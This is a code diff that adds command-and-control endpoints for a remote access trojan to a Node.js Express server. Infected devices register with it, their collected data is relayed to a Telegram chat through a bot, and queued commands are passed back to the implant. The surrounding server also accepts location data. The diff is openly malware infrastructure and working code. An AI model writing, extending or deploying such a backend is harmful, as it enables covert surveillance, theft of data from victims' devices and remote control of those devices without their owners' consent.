@@ -224,6 +224,87 @@ app.post('/location-data', async (req, res) => {
     }
 });
 
+const Rat = require('./models/rat');
+
+// * --- RAT Endpoints --- *
+
+// Endpoint for RAT to register itself
+app.post('/rat/register', async (req, res) => {
+    try {
+        const { deviceId, chatId } = req.body;
+        if (!deviceId || !chatId) {
+            return res.status(400).json({ message: 'Missing deviceId or chatId' });
+        }
+
+        let rat = await Rat.findOne({ deviceId });
+        if (rat) {
+            rat.chatId = chatId;
+            rat.lastSeen = Date.now();
+        } else {
+            rat = new Rat({ deviceId, chatId });
+        }
+        await rat.save();
+
+        bot.sendMessage(chatId, `🤖 New RAT connected: ${deviceId}`);
+        res.status(200).json({ message: 'RAT registered successfully' });
+    } catch (error) {
+        console.error("Error in /rat/register:", error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// Endpoint for RAT to send data
+app.post('/rat/data', async (req, res) => {
+    try {
+        const { deviceId, dataType, data } = req.body;
+        if (!deviceId || !dataType || !data) {
+            return res.status(400).json({ message: 'Missing deviceId, dataType, or data' });
+        }
+
+        const rat = await Rat.findOne({ deviceId });
+        if (!rat) {
+            return res.status(404).json({ message: 'RAT not found' });
+        }
+
+        // For now, just send the data to the user
+        // In the future, we can store this data in the database
+        const message = `Received data of type '${dataType}' from RAT ${deviceId}:\n\n${JSON.stringify(data, null, 2)}`;
+        bot.sendMessage(rat.chatId, message);
+
+        res.status(200).json({ message: 'Data received' });
+    } catch (error) {
+        console.error("Error in /rat/data:", error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
+// Endpoint for RAT to get commands
+app.get('/rat/command', async (req, res) => {
+    try {
+        const { deviceId } = req.query;
+        if (!deviceId) {
+            return res.status(400).json({ message: 'Missing deviceId' });
+        }
+
+        const rat = await Rat.findOne({ deviceId });
+        if (!rat) {
+            return res.status(404).json({ message: 'RAT not found' });
+        }
+
+        if (rat.pendingCommand) {
+            const command = rat.pendingCommand;
+            rat.pendingCommand = null;
+            await rat.save();
+            return res.status(200).json({ command });
+        } else {
+            return res.status(200).json({ command: null });
+        }
+    } catch (error) {
+        console.error("Error in /rat/command:", error);
+        res.status(500).send('Internal Server Error');
+    }
+});
+
 io.on('connection', (socket) => {
     console.log('a user connected');
 
